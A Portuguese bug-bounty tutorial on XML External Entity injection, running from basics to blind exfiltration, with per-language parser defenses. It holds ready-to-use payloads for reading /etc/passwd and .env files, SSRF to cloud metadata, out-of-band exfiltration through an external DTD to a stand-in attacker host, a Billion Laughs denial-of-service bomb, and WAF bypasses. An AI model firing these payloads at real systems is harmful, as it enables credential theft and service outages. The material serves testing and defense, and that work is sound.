---
title: "XXE (XML External Entity): abusando do parser de XML"
description: "Do básico ao avançado: como uma feature antiga do XML (entidades externas) lê /etc/passwd, vira SSRF, exfiltra dados às cegas e se esconde em uploads de SVG e Office — com payloads exatos e defesa por linguagem."
author: matheus
date: 2026-05-18 12:40:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["XXE", "XML External Entity", "XML", "DTD", "SSRF", "OOB", "blind XXE", "XInclude", "SVG", "SAML", "billion laughs", "OWASP", "bug bounty", "web security", "Burp Collaborator"]
image: /assets/img/covers/xxe-xml-external-entity.png
pin: false
comments: true
---

## Quando um "produto" no carrinho lê o seu /etc/passwd

Você está testando uma loja em `app.exemplo.com`. Ao consultar o estoque de um item, o Burp registra uma request meio fora de moda: o corpo não é JSON, é **XML**:

```http
POST /product/stock HTTP/2
Host: app.exemplo.com
Content-Type: application/xml

<?xml version="1.0"?>
<stockCheck><productId>381</productId></stockCheck>
```

Bate a curiosidade. E se, em vez de mandar `381`, eu mandar o servidor **ler um arquivo do disco dele** e me devolver no lugar do número? Você troca o corpo por isto:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

A resposta volta com `Invalid product ID: root:x:0:0:root:/root:/bin/bash...`. O parser de XML obedeceu, abriu o `/etc/passwd` e colou o conteúdo no lugar de `&xxe;`. Isso é **XXE** (XML External Entity injection), e é uma das falhas mais "elegantes" do bug bounty: você não explora um bug no código da aplicação, você abusa de uma **feature legítima e antiga do próprio formato XML**.

Neste post a gente vai do "o que é XML" até XXE cego com exfiltração via DTD externo, XInclude, ataque por upload de SVG/Office e defesa por linguagem. Tudo com payload verificado.

## O que é XML, DTD e entidade (a base que faz o XXE existir)

Antes de atacar, você precisa entender três peças. Sem elas, o payload vira decoreba, e decoreba não te deixa adaptar pro alvo real.

> 💡 **XML (eXtensible Markup Language)**: formato de texto pra estruturar dados em tags aninhadas, tipo `<pedido><id>10</id></pedido>`. Era o "JSON dos anos 2000" e ainda vive em SOAP, SAML, RSS, SVG e arquivos Office.

> 💡 **Parser**: o componente que lê o texto XML e o transforma em dados que o programa entende. O XXE acontece *dentro* do parser. É ele quem decide obedecer (ou não) às entidades.

> 💡 **DTD (Document Type Definition)**: a "gramática" opcional do documento XML. Declara quais tags e **entidades** existem. Vai dentro do `<!DOCTYPE ...>`, no topo do XML. É aqui que o atacante injeta a parte maliciosa.

> 💡 **Entidade**: um "atalho/variável" do XML. Você declara uma entidade e a usa com `&nome;`. Ex.: a entidade interna `&lt;` vira `<`. O parser **substitui** `&nome;` pelo valor antes de entregar o dado.

A peça que vira arma é um tipo específico de entidade:

> 💡 **Entidade externa (`SYSTEM`)**: uma entidade cujo valor vem de **fora**: de um arquivo (`file://`) ou de uma URL (`http://`). Declarada como `<!ENTITY xxe SYSTEM "file:///etc/passwd">`, ela diz ao parser: "quando vir `&xxe;`, vá buscar esse arquivo e cole o conteúdo aqui".

Juntando tudo, o payload clássico se lê assim, linha por linha:

```xml
<?xml version="1.0"?>                                <!-- prólogo XML -->
<!DOCTYPE foo [                                      <!-- abre o DTD interno -->
  <!ENTITY xxe SYSTEM "file:///etc/passwd">          <!-- declara a entidade externa -->
]>
<stockCheck><productId>&xxe;</productId></stockCheck> <!-- usa a entidade -->
```

> **Analogia:** a entidade é uma macro de planilha tipo `=IMPORTAR("arquivo.txt")`. Quem escreveu o XML legítimo nunca esperou que *você* fosse definir as macros. O parser, por padrão antigo, executa qualquer macro que você declarar, inclusive uma que importa o `/etc/passwd`.

A raiz do XXE é exatamente essa: **parser configurado pra resolver entidades externas** + **entrada de XML controlada pelo atacante**. Tira qualquer uma das duas e o ataque morre (guarde isso pra seção de defesa).

## Impacto e quanto paga

XXE entra no [OWASP Top 10](https://owasp.org/Top10/) dentro de **A05:2021 – Security Misconfiguration** (na edição de 2017 era a categoria própria A4). O impacto varia muito conforme o que você consegue alcançar:

| O que dá pra fazer | Severidade | Faixa de bounty (anonimizada) |
|---|---|---|
| Ler arquivo local (`/etc/passwd`, config, código-fonte) | Alto | R$1.500 – R$8.000 |
| **XXE → SSRF** (alcançar serviço interno / cloud metadata) | Crítico | R$8.000 – R$30.000+ |
| Roubar credencial em arquivo (`.env`, chave SSH, `web.config`) | Crítico | R$10.000+ |
| Blind XXE (só interação OOB, sem leitura) | Médio | R$500 – R$3.000 |
| DoS por expansão de entidade (Billion Laughs) | Alto (Disponibilidade) | varia muito (às vezes fora de escopo) |

Pra dar números aos dois cenários âncora (use como ponto de partida no report; ajuste ao contexto do alvo):

| Cenário | CVSS v3.1 | CVSS v4.0 |
|---|---|---|
| **Leitura de arquivo local** (in-band, ex.: `/etc/passwd`) | **7.5 (Alto)** · `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | **Alto** · `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| **XXE → SSRF** (metadata da nuvem / serviço interno, com pivô = scope change) | **9.3 (Crítico)** · `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | **Crítico** · `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:L/SI:N/SA:N` |

> 💡 **Por que o XXE→SSRF salta pra Crítico:** no v3.1 ele muda o **Scope** (`S:C`). O parser que você ataca consegue afetar **outro** componente de segurança (a rede interna / o metadata service). No v4.0 essa ideia migrou pros **Subsequent System metrics** (`SC/SI/SA`). Os scores numéricos exatos do v4.0 dependem da tabela oficial, então confira no [calculador FIRST v4.0](https://www.first.org/cvss/calculator/4.0); os vetores acima estão corretos por construção.

> 💡 **SSRF (Server-Side Request Forgery)**: fazer o servidor da vítima emitir requisições pra onde *você* quer (rede interna, `169.254.169.254` da nuvem). É o "pulo do gato" que transforma um XXE comum em crítico. Tem detalhe no post [SSRF](/posts/ssrf/).

> 💡 **PII (Personally Identifiable Information)**: dado pessoal identificável: nome, CPF, e-mail, endereço. Ler um arquivo com PII ou credenciais é o que justifica severidade alta no report.

O valor mora no **alcance**: ler um arquivo já é bom; ler a credencial AWS via metadata da nuvem é jackpot.

## Como funciona por trás (o fluxo do parser)

O servidor recebe seu XML e manda pro parser. Se o parser está com resolução de entidades externas **ligada** (padrão histórico de várias libs), o fluxo é:

1. Parser lê o `<!DOCTYPE>` e processa o DTD interno.
2. Encontra `<!ENTITY xxe SYSTEM "file:///etc/passwd">` → guarda a "macro".
3. Ao montar o documento, encontra `&xxe;` → **vai buscar** `file:///etc/passwd` no disco.
4. Substitui `&xxe;` pelo conteúdo do arquivo.
5. A aplicação processa o documento "expandido" e, se ela **reflete** esse valor na resposta, o conteúdo do arquivo aparece pra você.

```http
HTTP/2 400 Bad Request
Content-Type: application/json

{"error":"Invalid product ID: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}
```

O ponto-chave: **o parser nem desconfia**. Pra ele, `SYSTEM "file://..."` é uso legítimo do XML. O bug é de **configuração** (parser permissivo), não um erro de lógica que alguém "escreveu errado".

## Tipos e variações de XXE

| Tipo | Quando usar | Canal de saída |
|---|---|---|
| **In-band / clássico** | A resposta reflete a entidade | Direto na resposta HTTP |
| **XXE → SSRF** | Entidade aponta pra URL interna/cloud | Resposta ou OOB |
| **Blind / OOB** | A resposta NÃO reflete | Interação externa (DNS/HTTP) que você controla |
| **Error-based** | Não reflete, mas vaza em mensagens de erro | Texto da mensagem de erro |
| **XInclude** | Você só controla **um campo**, não o XML inteiro | Resposta (em geral) |
| **Via upload** | App parseia arquivo que é XML por dentro (SVG, DOCX, XLSX) | Resposta / OOB |

Vamos do mais fácil ao mais sofisticado.

## Exploração passo a passo (do básico ao avançado)

### Nível 1 — XXE clássico in-band (ler arquivo local)

O cenário do hook. A resposta **reflete** o valor que você injetou, então é só substituir um valor de dado por `&xxe;`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Onde apontar o `file://` (do mais útil pro report):
- `file:///etc/passwd`: prova clássica de leitura (Linux).
- `file:///etc/hostname`, `file:///proc/self/environ`: host e variáveis de ambiente (às vezes vazam segredos).
- Caminhos da app: `.env`, `config.php`, `application.properties`, `web.config`, onde moram **credenciais**. É o que sobe a severidade.

> ⚠️ **Cuidado com arquivos "que quebram o XML".** Se o arquivo contém `<`, `&` ou `]]>`, o parser pode dar erro ao expandir a entidade dentro do documento. `/etc/passwd` é puro texto e funciona liso. Por isso vira o "Hello World" do XXE.

**Truque PHP: ler código-fonte sem quebrar o parser.** Em apps PHP, o wrapper `php://filter` lê o arquivo e te devolve em **Base64**, que é texto seguro pro XML (não tem `<` nem `&`):

> 💡 **`php://filter` / wrapper PHP**: um "stream" do PHP que transforma o conteúdo antes de entregar. `convert.base64-encode` codifica em Base64, permitindo extrair `.php` (que tem `<?php` e quebraria o XML cru).

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<contacts><contact><name>&xxe;</name></contact></contacts>
```

A resposta traz um blob Base64; você decodifica e lê o `index.php`. (O `php://filter` também é a alma do [LFI](/posts/lfi-path-traversal/), vale revisar lá.)

### Nível 2 — XXE → SSRF (alcançar a rede interna e a nuvem)

Em vez de `file://`, aponte a entidade pra uma **URL**. O parser faz a requisição **a partir do servidor**, te dando uma ponte pra rede interna:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

> 💡 **Cloud metadata (`169.254.169.254`)**: endereço "link-local" que só responde **de dentro** de uma instância na nuvem (AWS/GCP/Azure). Numa AWS com IMDSv1, ele entrega **credenciais IAM temporárias** — o jackpot do SSRF.

Se a resposta reflete, você lê a credencial direto. Se não reflete, cai no caso cego (Nível 3). Esse encadeamento XXE→SSRF é **a** razão de XXE virar crítico. Leia a mecânica completa de bypasses, IMDSv2 e schemes exóticos no post de [SSRF](/posts/ssrf/).

### Nível 3 — Blind / OOB XXE (quando a resposta não reflete nada)

Na vida real, a maioria das apps **não** devolve o valor da entidade na resposta. Isso é XXE **cego (blind)**. Você ainda confirma e até exfiltra dados, mas pelo "fundo do quintal": um canal **out-of-band (OOB)**.

> 💡 **OOB (Out-of-Band) / OAST**: em vez de ver a resposta na mesma conexão, você usa um servidor **seu** (ex.: Burp Collaborator) e observa se o alvo te faz uma requisição DNS/HTTP. Se chegou interação, o payload funcionou, mesmo sem nada aparecer na resposta HTTP.

> 💡 **Burp Collaborator**: servidor de DNS/HTTP que a Burp te dá com um subdomínio único. Você coloca esse subdomínio no payload e fica de olho no painel pra ver as "batidas". É o detector universal de blind/OOB.

**Passo 3a, detectar com uma entidade externa apontando pro seu servidor:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://SEU-ID.collaborator.net"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Se o Collaborator registrar um hit de DNS/HTTP, o parser resolveu sua entidade externa → **XXE cego confirmado**.

**Passo 3b, exfiltrar o arquivo via DTD externo (parameter entities).** Aqui entra a técnica que separa o iniciante do avançado. Você não consegue colocar `&xxe;` (entidade geral) no corpo de uma definição de entidade: o XML proíbe. A saída é usar **entidades de parâmetro**.

> 💡 **Entidade de parâmetro (`% nome;`)**: tipo especial de entidade que só vale **dentro do DTD** e se referencia com `%nome;` (porcento, não `&`). É a peça que permite montar entidades dinamicamente e burlar a restrição do XXE cego.

Você **hospeda** um DTD malicioso no seu servidor (`http://alvo-do-atacante.net/exfil.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://alvo-do-atacante.net/?x=%file;'>">
%eval;
%exfiltrate;
```

E no XML enviado pra aplicação, você **importa** esse DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://alvo-do-atacante.net/exfil.dtd"> %xxe; ]>
<stockCheck><productId>1</productId></stockCheck>
```

O que acontece, em câmera lenta:
1. A app importa seu `exfil.dtd`.
2. `%file` lê o `/etc/passwd` pra dentro de uma variável.
3. `%eval` **declara dinamicamente** a entidade `exfiltrate`, cujo valor é uma URL pro seu servidor **com o conteúdo do arquivo na query string** (`?x=...`).
4. `%exfiltrate` dispara a requisição → o `/etc/passwd` chega no **seu** servidor, na URL.

> 💡 **Por que `&#x25;` em vez de `%`?** `&#x25;` é o caractere `%` escapado. Dentro da string de uma entidade, um `%` literal confundiria o parser (ele acharia que é o início de outra entidade de parâmetro). Escapando, o `%` só "nasce" quando a entidade interna é finalmente montada. É detalhe de sintaxe, mas **sem ele o payload não monta**. Por isso copie exatamente assim.

> ⚠️ **DTD externo tem que estar `http`/acessível pelo alvo.** Hospede num servidor público seu (um `python3 -m http.server`, um bucket, etc.) e confirme que o alvo consegue alcançá-lo. Se a rede do alvo bloqueia saída HTTP, parta pro error-based abaixo.

**Passo 3c, XXE error-based (exfiltrar pela mensagem de erro).** Quando não há canal OOB de saída, dá pra fazer o **dado vazar dentro de uma mensagem de erro** do parser. O DTD malicioso tenta abrir um arquivo **inexistente cujo nome contém o conteúdo do arquivo-alvo**:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Como `/nonexistent/<conteúdo do passwd>` não existe, o parser solta um erro tipo:

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin (No such file or directory)
```

O `/etc/passwd` aparece **no texto do erro**. Funciona só se a app **devolver erros verbosos** (stack trace), comum em ambientes mal configurados.

### Nível 4 — XInclude (você só controla UM campo, não o XML inteiro)

Às vezes o alvo recebe um valor seu (ex.: um parâmetro de formulário comum, `application/x-www-form-urlencoded`) e o **embute** num XML montado no servidor. Você não controla o `<!DOCTYPE>`, então o XXE clássico não cola. A saída é **XInclude**:

> 💡 **XInclude**: feature do XML pra incluir o conteúdo de outro arquivo/recurso em um ponto do documento, via namespace `xi`. Não precisa de DOCTYPE/DTD, e é por isso que funciona quando você só controla um pedacinho.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Você manda só esse trecho no campo controlado; o servidor o injeta no XML maior e o parser, ao processar o `xi:include`, lê o arquivo. O `parse="text"` é importante: trata o arquivo como texto puro (senão tentaria parsear como XML e quebraria com `/etc/passwd`).

### Nível 5 — XXE via UPLOAD (SVG, Office, SOAP)

Esta é a superfície que mais passa despercebida: **arquivos que são XML por dentro**. Se a app parseia o arquivo no servidor (gerar thumbnail, extrair metadados, converter), o XXE entra pela porta dos fundos.

**SVG**: imagem vetorial é XML puro. Suba um `.svg` malicioso onde a app aceita "imagem" (avatar, logo, anexo):

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Se o servidor renderiza o SVG (ex.: converte pra PNG), o conteúdo do arquivo lido aparece **dentro da imagem gerada**, um vazamento literalmente visível. (SVG também é vetor clássico de [XSS](/posts/xss-html-injection/) quando servido como `image/svg+xml` e aberto no navegador, vale o duplo teste.)

**Arquivos Office (DOCX, XLSX, PPTX)** são, por dentro, **arquivos ZIP cheios de XML**.

> 💡 **DOCX/XLSX = ZIP + XML**: abra um `.docx` com um descompactador e você vê `[Content_Types].xml`, `word/document.xml` etc. (a assinatura `PK` no começo do arquivo denuncia o ZIP). A app que processa esses arquivos roda um parser XML, alvo de XXE.

Ataque: descompacte um `.docx`/`.xlsx` válido, injete o `<!DOCTYPE ...>` com a entidade no XML interno (ex.: `word/document.xml` ou `[Content_Types].xml`), **recompacte** com o mesmo nome e suba. Se o parser do servidor estiver vulnerável, ele resolve a entidade ao abrir o documento.

**SOAP / SAML / APIs XML legadas**: serviços SOAP trafegam XML por natureza, e o **SAML** (asserções de login federado/SSO) é XML puro que o IdP/SP parseia no servidor. O mesmo `<!DOCTYPE>` malicioso injetado no envelope SOAP ou na `SAMLResponse` (antes do encode Base64 que muitos fluxos usam) pode disparar XXE. Fique de olho em endpoints de SSO. Vale também o truque de **trocar o Content-Type**: uma API que aceita JSON às vezes também aceita XML. Mude `Content-Type: application/json` pra `application/xml` (ou `text/xml`) e reenvie o corpo reescrito em XML; se o backend parsear, você tem superfície de XXE onde ninguém esperava.

### Nível 6 — Billion Laughs (DoS por expansão de entidade)

Aqui o objetivo muda: não é ler arquivo, é **derrubar o serviço**. A "bomba bilhão de risadas" aninha entidades **internas** (sem `SYSTEM`, sem rede) que se referenciam em cascata. Cada nível multiplica por 10: `lol9` expande pra ~10⁹ vezes a string `lol`, estourando RAM/CPU do parser.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

> ⚠️ **NÃO dispare isto num alvo de produção.** Diferente da leitura de arquivo, este payload **causa dano real** (consome memória até o processo morrer) e pode tirar o serviço do ar. Isso extrapola "provar a falha" e vira interrupção. Faça em **lab** ou, no máximo, com **autorização explícita** do programa pra teste de DoS. Para *provar* a vulnerabilidade sem derrubar nada, prefira reduzir os níveis (ex.: até `lol4`) e medir o tempo/CPU de resposta, ou apenas reportar que o parser aceita DTD com entidades internas. É **DoS**, não leitura, então costuma valer menos e, em muitos programas, está **fora de escopo** (veja [Denial of Service de aplicação](/posts/denial-of-service-aplicacao/)).

### Nível 7 — Bypass quando entidades/DTD estão parcialmente bloqueados

Às vezes existe um filtro (WAF ou um bloqueio meia-boca no app) que barra a **string** `<!DOCTYPE` ou `<!ENTITY`. A chave é lembrar: **quem decide se há XXE é o parser, não o WAF**. Então o jogo é fazer o payload chegar ao parser sem "parecer" XXE pro filtro.

**Troca de encoding (UTF-16 / UTF-7).** O parser detecta a codificação pelo BOM ou pela declaração `encoding=`. Se você reencodar o XML inteiro pra **UTF-16**, um WAF que faz match de substring/regex em ASCII **não enxerga** `<!DOCTYPE` (os bytes estão intercalados com `00`), mas o parser lê normalmente:

```bash
# converte o payload XXE de UTF-8 pra UTF-16 Big-Endian
cat xxe-utf8.xml | iconv -f UTF-8 -t UTF-16BE > xxe-utf16.xml
# envie o arquivo resultante como corpo da request
```

> ⚠️ **UTF-7 é situacional.** O clássico `<?xml version="1.0" encoding="UTF-7"?>` com o corpo em UTF-7 só funciona se **aquele parser específico ainda suportar UTF-7**. O libxml2, por exemplo, **não** suporta UTF-7. Em parsers Java/.NET legados pode colar. Na dúvida, **UTF-16BE é a aposta mais confiável**. Confirme caso a caso.

**`PUBLIC` no lugar de `SYSTEM`.** Os dois são quase sinônimos pra declarar entidade externa; trocar pode driblar um filtro que só procura a palavra `SYSTEM`:

```xml
<!DOCTYPE foo [ <!ENTITY xxe PUBLIC "qualquer id" "file:///etc/passwd"> ]>
```

**Parameter entities pra esconder a entidade externa.** Como visto no blind, mover a declaração `SYSTEM` pra dentro de um DTD externo (`%`) tira a string suspeita do corpo enviado: o filtro vê só uma importação aparentemente inofensiva.

## Recon e detecção — onde caçar XXE

Sinais de que tem XML (logo, possível XXE) rodando:

- **Content-Type de XML** em requests: `application/xml`, `text/xml`, `application/soap+xml`.
- **Corpos XML** em qualquer lugar: SOAP, SAML (login federado/SSO), RSS, sitemaps, APIs antigas.
- **Uploads** que aceitam SVG, DOCX, XLSX, PPTX, ou qualquer formato baseado em XML.
- **Endpoints "de integração"/legados**: XXE adora sistema velho.

Roteiro de detecção:

1. **Tem reflexão?** Injete `&xxe;` lendo `/etc/passwd` (ou `php://filter`) e veja se volta na resposta → in-band.
2. **Não reflete?** Aponte uma entidade externa pro Burp Collaborator. Hit de DNS/HTTP → blind XXE confirmado.
3. **Reflete erro?** Force o error-based com o `file:///nonexistent/%file;`.
4. **Só um campo?** Tente **XInclude**.
5. **Upload?** Suba SVG/DOCX malicioso e veja se o conteúdo vaza no resultado.

Ferramentas que ajudam:

- **Burp Suite**: Repeater (editar o XML à mão), **Collaborator** (detectar OOB), e o scanner ativo já testa XXE automaticamente.
- **Burp extension "Content Type Converter"**: converte JSON↔XML num clique, pra testar o truque de trocar o Content-Type.
- **`python3 -m http.server`**: sobe rápido o servidor que hospeda seu `exfil.dtd` e recebe a exfiltração. (Apresentado no post [Recon & Discovery](/posts/recon-discovery/).)
- **[XXEinjector](https://github.com/enjoiz/XXEinjector)** / **[OXML_XXE](https://github.com/BuffaloWill/oxml_xxe)**: automatizam exfiltração OOB e a geração de Office/SVG envenenados.

## Caso real-fictício: blind XXE → exfiltração de `.env` via DTD externo

> Cenário **fictício, baseado em padrões reais** de programas de bug bounty (anonimizado).

Você testa `app.exemplo.com`, um sistema de orçamentos que importa propostas em XML. O endpoint não reflete nada útil na resposta (XXE cego). Plano: confirmar via OOB e exfiltrar o `.env`.

**Passo 1, confirmar (OOB).** Subo um servidor meu e mando:

```http
POST /proposals/import HTTP/2
Host: app.exemplo.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://AAAA1111.collaborator.net"> ]>
<proposal><title>&xxe;</title></proposal>
```

No Collaborator pinga um DNS + HTTP vindo do IP do servidor da `app.exemplo.com`. **Blind XXE confirmado.**

**Passo 2, hospedar o DTD malicioso** em `http://192.0.2.10:8000/exfil.dtd` (`192.0.2.0/24` é faixa de documentação, aqui faz papel do "meu servidor"):

```xml
<!ENTITY % file SYSTEM "file:///var/www/app/.env">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.0.2.10:8000/?x=%file;'>">
%eval;
%exfiltrate;
```

**Passo 3, disparar a importação do DTD:**

```http
POST /proposals/import HTTP/2
Host: app.exemplo.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.0.2.10:8000/exfil.dtd"> %xxe; ]>
<proposal><title>x</title></proposal>
```

**O que a tela mostraria:** no terminal do `http.server`, uma linha de log com o `.env` na query (em geral URL-encoded):

```
192.0.2.250 - - [31/May/2026 14:02:11] "GET /?x=DB_PASSWORD=Sup3rS3cr3t%0aSTRIPE_KEY=sk_live_... HTTP/1.1" 200 -
```

Pronto: a credencial do banco e a chave de pagamento saíram do servidor da vítima sem nunca aparecer numa resposta HTTP visível.

**Passo 4, report.** Título: `[XXE] Blind XML External Entity em /proposals/import → leitura de arquivos e exfiltração de credenciais (.env)`. Severidade **Crítica** (leitura de credenciais + potencial SSRF). Inclua: a request de detecção OOB, o `exfil.dtd`, a request de disparo e o log do Collaborator/servidor (com segredos mascarados). Foque o resumo no risco de negócio: *"qualquer um que envie um XML lê arquivos arbitrários do servidor, incluindo credenciais de banco e chaves de API"*. Como escrever isso bem: [Como escrever um report que paga](/posts/como-escrever-report-que-paga/).

## Defesa em camadas (a chave é desabilitar DTD/entidades externas)

A correção definitiva é **uma só**: configurar o parser pra **não resolver DTDs nem entidades externas**. Frontend e WAF não resolvem XXE de verdade. A defesa é no parser, por linguagem. A regra de ouro: **se a app não precisa de DTD (quase nunca precisa), desabilite o DOCTYPE inteiro** — mata XXE, XInclude e Billion Laughs de uma vez.

### Java (`DocumentBuilderFactory`, SAX, StAX)

A defesa nº 1 é proibir a declaração de DOCTYPE:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// PRINCIPAL: proíbe <!DOCTYPE> -> mata XXE de raiz
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Se DTD for mesmo necessário, ao menos desligue entidades externas:
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// Reforço:
dbf.setXIncludeAware(false);            // mata XInclude
dbf.setExpandEntityReferences(false);
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
```

Para `XMLInputFactory` (StAX):

```java
// PRINCIPAL: desliga DTD por completo
xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
// Se não puder desligar o DTD, ao menos zere o acesso externo:
xmlInputFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
xmlInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
```

### .NET (C#)

Versões **a partir do .NET Framework 4.5.2** já são seguras por padrão (`XmlResolver = null`). Em código mais antigo, force:

```csharp
var settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // proíbe DTD -> mata XXE
settings.XmlResolver   = null;                     // não resolve recursos externos
var reader = XmlReader.Create(stream, settings);
```

Para `XmlDocument` legado: `xmlDoc.XmlResolver = null;`.

### PHP

A boa notícia: desde o **libxml 2.9.0** (set/2012) a **substituição de entidades vem desligada por padrão**: a expansão da entidade externa só acontece se você passar a flag `LIBXML_NOENT`. Por isso a função `libxml_disable_entity_loader()` foi **descontinuada no PHP 8.0** (virou desnecessária). Em PHP moderno, o XXE clássico via `SimpleXML`/`DOMDocument` não dispara sozinho.

> 💡 **História do `libxml_disable_entity_loader`**: por anos, o conselho em PHP era chamar `libxml_disable_entity_loader(true)` antes de parsear. Com o libxml 2.9+ trazendo o padrão seguro e o PHP 8.0 marcando a função como deprecated/no-op, o ecossistema migrou pra confiar no default. **Não use a flag `LIBXML_NOENT`**. Apesar do nome ("no entities"), ela **liga** a substituição de entidades, abrindo a porta pro XXE.

```php
// PHP 8.0+: seguro por padrão. NÃO faça isto:
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);  // <- PERIGOSO: reativa XXE

// Faça simplesmente (default já é seguro):
$dom = new DOMDocument();
$dom->loadXML($xml);

// Em PHP < 8.0, por garantia (no-op em libxml moderno):
// libxml_set_external_entity_loader(null);  // recomendação atual do OWASP
// libxml_disable_entity_loader(true);       // forma antiga (deprecated no 8.0)
```

> 💡 **`LIBXML_NO_XXE` (PHP 8.4+ / libxml ≥ 2.13)**: flag nova que **bloqueia XXE explicitamente** ao parsear, mesmo se você (ou uma lib de terceiros) passar `LIBXML_DTDLOAD`/`LIBXML_NOENT`. Se estiver no PHP 8.4+, usá-la é o cinto-e-suspensório: `$dom->loadXML($xml, LIBXML_NO_XXE);`.

### Python

A biblioteca padrão (`xml.etree`, `minidom`, `sax`...) **não tem flag fácil** pra blindar tudo. A recomendação oficial é trocar pela **`defusedxml`**:

> 💡 **`defusedxml`**: pacote drop-in que substitui os parsers da stdlib por versões que já bloqueiam entidades externas, DTDs e bombas de expansão. Você troca o `import` e pronto.

```python
# Em vez de:  import xml.etree.ElementTree as ET
from defusedxml.ElementTree import parse, fromstring   # seguro contra XXE

tree = parse("entrada.xml")
```

> ❌ **O que NÃO basta:** filtrar a string `<!DOCTYPE` no WAF (dá pra ofuscar/encodar), validar só no frontend, ou usar UUIDs/HTTPS. XXE é decisão **do parser**: se ele resolve entidade externa, nenhuma camada acima salva.

## Checklist do caçador

- [ ] O alvo aceita XML? (`Content-Type: application/xml`/`text/xml`, SOAP, SAML, RSS)
- [ ] Testei o XXE clássico (`file:///etc/passwd` refletido) e o `php://filter` em apps PHP.
- [ ] A resposta não reflete? Confirmei com entidade externa apontando pro **Collaborator** (blind).
- [ ] Tentei exfiltração **OOB** via DTD externo (parameter entities, `&#x25;`).
- [ ] Tentei **error-based** (`file:///nonexistent/%file;`) onde os erros são verbosos.
- [ ] Só controlo um campo? Testei **XInclude** (`xi:include parse="text"`).
- [ ] Testei **uploads**: SVG, DOCX, XLSX (ZIP+XML), troca de Content-Type JSON→XML.
- [ ] Apontei pra **cloud metadata** (`169.254.169.254`) e serviços internos (XXE→SSRF).
- [ ] Mirei arquivos de **credencial** (`.env`, `web.config`, chaves) pra subir a severidade.
- [ ] Filtro barrando `<!DOCTYPE`/`SYSTEM`? Tentei **bypass** (UTF-16BE via `iconv`, `PUBLIC`, parameter entities).
- [ ] DoS (Billion Laughs) só **com autorização explícita** / em lab, nunca solto em produção.

## Pegadinhas / o que NÃO funciona

